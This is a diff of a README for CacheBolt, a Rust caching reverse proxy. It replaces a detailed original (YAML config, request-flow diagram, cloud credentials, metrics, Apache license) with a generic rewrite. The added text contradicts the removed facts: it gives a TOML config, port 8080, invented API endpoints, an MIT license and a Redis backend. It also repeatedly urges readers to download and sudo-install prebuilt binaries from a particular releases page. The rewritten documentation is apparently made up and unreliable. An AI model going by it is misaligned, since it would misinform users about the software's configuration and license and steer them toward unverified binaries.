@@ -1,281 +1,200 @@
-# ⚡️ CacheBolt
+# CacheBolt 🚀
 
-> A blazing-fast reverse proxy with intelligent caching and multi-backend object storage support.
+![CacheBolt](https://img.shields.io/badge/CacheBolt-v1.0.0-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg)
+
+**A blazing-fast reverse proxy with intelligent caching and multi-backend object storage support.**
+
+## Table of Contents
+
+- [Introduction](#introduction)
+- [Features](#features)
+- [Getting Started](#getting-started)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Configuration](#configuration)
+- [API Reference](#api-reference)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
+
+## Introduction
+
+CacheBolt is designed to optimize API performance through intelligent caching and efficient data storage. It serves as a reverse proxy, handling requests with speed and reliability. With support for multiple backends, CacheBolt can manage various data sources, making it an ideal choice for modern applications.
+
+## Features
+
+- **High Performance**: Built with Rust, CacheBolt provides exceptional speed and efficiency.
+- **Intelligent Caching**: Automatically caches responses to reduce load on backend services.
+- **Multi-Backend Support**: Connects to various storage solutions, including Redis and cloud services.
+- **Flexible Configuration**: Easily configure caching rules and backend connections.
+- **Robust API**: Offers a simple and powerful API for integration with your applications.
+- **Sidecar Proxy**: Can be deployed as a sidecar for microservices architectures.
+
+## Getting Started
+
+To start using CacheBolt, you need to have Rust installed on your machine. You can find the installation instructions on the [official Rust website](https://www.rust-lang.org/tools/install).
+
+### Prerequisites
+
+- Rust 1.50 or higher
+- Cargo (comes with Rust)
+- A compatible backend (e.g., Redis)
+
+## Installation
+
+You can download the latest release of CacheBolt from the [Releases](https://github.com/faryzsolt/CacheBolt/releases) section. Follow the instructions below to install it:
+
+1. Go to the [Releases](https://github.com/faryzsolt/CacheBolt/releases) page.
+2. Download the appropriate binary for your operating system.
+3. Extract the downloaded file.
+4. Move the binary to a directory in your PATH.
+
+### Example Installation Commands
+
+For Linux:
+
+```bash
+wget https://github.com/faryzsolt/CacheBolt/releases/download/v1.0.0/cachebolt-linux-amd64.tar.gz
+tar -xzf cachebolt-linux-amd64.tar.gz
+sudo mv cachebolt /usr/local/bin/
+```
+
+For macOS:
+
+```bash
+curl -LO https://github.com/faryzsolt/CacheBolt/releases/download/v1.0.0/cachebolt-macos-amd64.tar.gz
+tar -xzf cachebolt-macos-amd64.tar.gz
+sudo mv cachebolt /usr/local/bin/
+```
+
+For Windows:
+
+1. Download the ZIP file from the [Releases](https://github.com/faryzsolt/CacheBolt/releases).
+2. Extract the ZIP file.
+3. Add the extracted directory to your system PATH.
+
+## Usage
+
+Once installed, you can start CacheBolt with the following command:
+
+```bash
+cachebolt --config /path/to/config.toml
+```
+
+### Basic Command-Line Options
+
+- `--config`: Specify the path to the configuration file.
+- `--port`: Set the port on which CacheBolt will listen (default is 8080).
+- `--debug`: Enable debug logging for troubleshooting.
+
+## Configuration
+
+CacheBolt uses a TOML file for configuration. Below is a sample configuration file:
+
+```toml
+[server]
+port = 8080
+
+[cache]
+enabled = true
+ttl = 3600  # Time to live in seconds
+
+[backend]
+type = "redis"
+host = "localhost"
+port = 6379
+```
+
+### Configuration Sections
+
+- **server**: Configure server settings, including the port.
+- **cache**: Enable or disable caching and set the time-to-live (TTL) for cached responses.
+- **backend**: Define the type and connection details for your backend storage.
+
+## API Reference
+
+CacheBolt exposes a RESTful API for managing cache and backend settings. Below are some key endpoints:
+
+### Get Cache Status
+
+```
+GET /api/cache/status
+```
+
+Returns the current status of the cache.
+
+### Clear Cache
+
+```
+POST /api/cache/clear
+```
+
+Clears the entire cache.
+
+### Backend Status
+
+```
+GET /api/backend/status
+```
+
+Checks the health of the configured backend.
+
+## Contributing
+
+We welcome contributions to CacheBolt. If you would like to contribute, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch to your forked repository.
+5. Open a pull request.
+
+Please ensure that your code follows the project's coding standards and includes tests where applicable.
+
+## License
+
+CacheBolt is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For questions or support, please reach out to the maintainer:
+
+- **Name**: Solt Faryz
+- **Email**: faryzsolt@example.com
+
+## Releases
+
+To stay updated with the latest features and improvements, visit the [Releases](https://github.com/faryzsolt/CacheBolt/releases) section. Download the latest version and enjoy the benefits of CacheBolt in your projects!
 
 ---
 
-## 🚀 Introduction
+CacheBolt is an exciting project that aims to improve API performance and reliability. With its focus on intelligent caching and support for multiple backends, it provides developers with a powerful tool for modern application architecture. Whether you are building a microservices environment or need a robust caching solution, CacheBolt can help you achieve your goals.
 
-**CacheBolt** is a high-performance reverse proxy designed to cache and serve responses with minimal latency. It intelligently stores responses in memory and synchronizes them with persistent object storage backends.
+### Why Choose CacheBolt?
 
-This tool is ideal for accelerating APIs, file delivery, and improving reliability under high load.
+In today's fast-paced development environment, speed and efficiency are crucial. CacheBolt addresses these needs by providing a reverse proxy that not only speeds up API calls but also intelligently caches responses. This means less load on your backend services and faster response times for your users.
 
-CacheBolt reads its configuration from a YAML file. By default, it expects a file named:
+### Use Cases
 
-```bash
-./config.yaml
-```
+1. **Microservices Architecture**: Deploy CacheBolt as a sidecar to manage API calls between services efficiently.
+2. **E-commerce Applications**: Use CacheBolt to cache product information, reducing load times during peak shopping hours.
+3. **Content Delivery**: Implement CacheBolt to cache frequently accessed content, ensuring quick delivery to users.
 
-You can override this path via CLI:
+### Community and Support
 
-```bash
-./cachebolt --config ./path/to/custom.yaml
-```
----
+Join our community to share your experiences, ask questions, and contribute to the development of CacheBolt. We value feedback and suggestions from users, as they help us improve the project.
 
-### ✨ Features
+### Future Plans
 
-- 🔁 Reverse HTTP proxy powered by [Axum](https://github.com/tokio-rs/axum) and [Tokio](https://tokio.rs/)
-- 🚀 Fast, concurrent in-memory caching with LRU eviction
-- ☁️ Multi-cloud object store support:
-  - 🟢 Amazon S3
-  - 🔵 Google Cloud Storage
-  - 🔶 Azure Blob Storage
-  - 💽 Local filesystem
-- 📉 Memory-based cache eviction (threshold-configurable)
-- ⏱️ Latency-based failover policies (regex route rules)
-- 🧠 Smart fallback if upstreams are slow or unavailable
+We plan to enhance CacheBolt with additional features, including:
 
----
-## 🔁 Request Flow
+- Support for more backend storage options.
+- Advanced caching strategies.
+- Enhanced monitoring and analytics tools.
 
-```text
-Client sends GET request
-        |
-        v
-┌────────────────────────────────────────────────────────┐
-│            proxy_handler receives request              │
-└────────────────────────────────────────────────────────┘
-        |
-        v
-Check if URI is marked as degraded (should_failover)
-        |
-        ├── Yes --> try_cache(key)
-        │            ├── Hit in memory? 
-        │            │     └── ✅ Serve from memory
-        │            ├── Else: Hit in storage?
-        │            │     └── ✅ Load from selected storage backend (GCS, S3, Azure, or Local)
-        │            │            └── Load into memory + Serve
-        │            └── Else: ❌ Return 502 (no cache, no backend)
-        │
-        └── No
-             |
-             v
-      Check MEMORY_CACHE for key
-             |
-             ├── Hit --> ✅ Serve from memory
-             └── Miss
-                  |
-                  v
-         Acquire semaphore (concurrency guard)
-                  |
-                  ├── Denied --> Check memory again
-                  │               ├── Hit --> ✅ Serve
-                  │               └── ❌ Return 502 (overloaded)
-                  |
-                  └── Acquired --> forward_request to backend
-                                   |
-                                   ├── Response latency > threshold?
-                                   │         └── Yes --> mark_latency_fail
-                                   |
-                                   ├── Downstream OK?
-                                   │         |
-                                   │         ├── Build CachedResponse
-                                   │         ├── In failover mode?
-                                   │         │     ├── Yes --> Skip caching
-                                   │         │     └── No:
-                                   │         │           ├── Put in MEMORY_CACHE
-                                   │         │           └── Send to CACHE_WRITER (persist to backend)
-                                   │         └── ✅ Return response
-                                   |
-                                   └── Downstream failed --> try_cache fallback
-```
-
-
----
-## 🔧 Configuration
-
-The config is written in YAML. Example:
-
-```yaml
-app_id: my-service
-
-max_concurrent_requests: 200
-downstream_base_url: http://localhost:4000
-downstream_timeout_secs: 5
-
-storage_backend: s3  # options: gcs, s3, azure, local
-gcs_bucket: cachebolt
-s3_bucket: my-cachebolt-bucket
-azure_container: cachebolt-container
-
-memory_eviction:
-  threshold_percent: 90
-
-latency_failover:
-  default_max_latency_ms: 300
-  path_rules:
-    - pattern: "^/api/v1/products/.*"
-      max_latency_ms: 150
-    - pattern: "^/auth/.*"
-      max_latency_ms: 100
-ignored_headers:
-  - postman-token
-```
+Stay tuned for updates and new releases!
 
 ---
 
-## 🔐 Cloud Storage Authentication
-
-Depending on the storage backend, you'll need to configure credentials via environment variables:
-
-### Google Cloud Storage (GCS)
-- Must be authenticated using Application Default Credentials (ADC), which you can set via:
-```bash
-export GOOGLE_APPLICATION_CREDENTIALS="/path/to/service-account.json"
-```
-
-### Amazon S3
-- Required environment variables:
-```bash
-export AWS_ACCESS_KEY_ID=your-access-key-id
-export AWS_SECRET_ACCESS_KEY=your-secret-key
-export AWS_REGION=us-east-1  # or your specific region
-```
-
-### Azure Blob Storage
-- Required environment variables:
-```bash
-export AZURE_STORAGE_ACCOUNT=your_account_name
-export AZURE_STORAGE_ACCESS_KEY=your_access_key
-```
-
-### Local Filesystem
-- No additional credentials required. Cache files will be saved locally.
-
----
-
-## ▶️ Running the Binary
-
-Default mode:
-```bash
-./cachebolt
-```
-
-Custom config path:
-```bash
-./cachebolt --config ./config/prod.yaml
-```
-
-Docker:
-```bash
-docker run --rm -p 3000:3000 \
-  -v $(pwd)/config:/config \
-  -v $(pwd)/cache:/data \
-  -e GOOGLE_APPLICATION_CREDENTIALS=/config/adc.json \
-  ghcr.io/<your-org>/cachebolt:latest \
-  --config /config/config.yaml
-```
-
----
-
-## 📦 Building
-
-To build locally:
-```bash
-cargo build --release
-```
-
-To cross-compile:
-See `.github/workflows/release.yml` for cross-target examples.
-
----
-
-## 📊 Prometheus Metrics
-
-CacheBolt exposes Prometheus-compatible metrics at the `/metrics` endpoint on port `3000`. These metrics allow you to monitor request flow, latency thresholds, memory caching, and backend persistence.
-
-### Request Metrics
-
-- `cachebolt_proxy_requests_total{uri}`  
-  Total number of proxy requests received, labeled by URI.
-
-- `cachebolt_downstream_failures_total{uri}`  
-  Count of downstream request failures per URI.
-
-- `cachebolt_rejected_due_to_concurrency_total{uri}`  
-  Requests rejected due to max concurrency being exceeded.
-
-- `cachebolt_failover_total{uri}`  
-  Requests served via failover mode due to recent high latency.
-
-### In-Memory Cache Metrics
-
-- `cachebolt_memory_hits_total{uri}`  
-  Requests served directly from the in-memory cache.
-
-- `cachebolt_memory_store_total{uri}`  
-  Responses stored into the in-memory cache.
-
-- `cachebolt_memory_fallback_hits_total`  
-  Failover-mode requests served from memory cache.
-
-### Latency Monitoring
-
-- `cachebolt_proxy_request_latency_ms{uri}`  
-  Histogram of proxy request latency in milliseconds.
-
-- `cachebolt_latency_exceeded_ms{uri}`  
-  Histogram of requests whose latency exceeded the configured threshold.
-
-- `cachebolt_latency_exceeded_total{uri}`  
-  Count of latency threshold violations per URI.
-
-### Persistent Storage Metrics
-
-- `cachebolt_persist_attempts_total{backend}`  
-  Number of attempts to persist cache entries into the selected backend.
-
-- `cachebolt_persist_errors_total{backend}`  
-  Number of failed attempts to persist cache entries.
-
-- `cachebolt_persistent_fallback_hits_total`  
-  Requests served from persistent storage (GCS, S3, Azure, or local) during failover.
-
-- `cachebolt_fallback_miss_total`  
-  Count of failover attempts that missed both memory and persistent storage.
-
----
-## 🧹 Cache Invalidation
-
-You can clear the entire cache (both in-memory and persistent storage) using the `/cache?backend=true` endpoint. This is useful when deploying major updates or invalidating stale content globally.
-
-- When `backend=true`, CacheBolt will delete all cache entries stored in:
-  - 🟢 Amazon S3
-  - 🔵 Google Cloud Storage
-  - 🔶 Azure Blob Storage
-  - 💽 Local Filesystem
-
-### ❌ Pattern-based deletion limitations
-
-If you attempt to use `pattern=...` with `backend=true`, CacheBolt will return an error. Pattern-based invalidation is **only supported in-memory**, not in persistent storage.
-
-### ✅ Example: Full cache invalidation
-
-```bash
-curl -X DELETE "http://localhost:3000/cache?backend=true"
-```
-
-This will:
-
-Clear all in-memory cache
-
-Batch-delete all objects under the prefix cache/{app_id}/ from the configured storage backend
-
-On S3, it uses optimized DeleteObjects requests (up to 1000 keys per request)
-
----
-
-## 📄 License
-
-Licensed under the [Apache License 2.0](./LICENSE).
+Thank you for your interest in CacheBolt. We look forward to seeing how you use it in your projects!
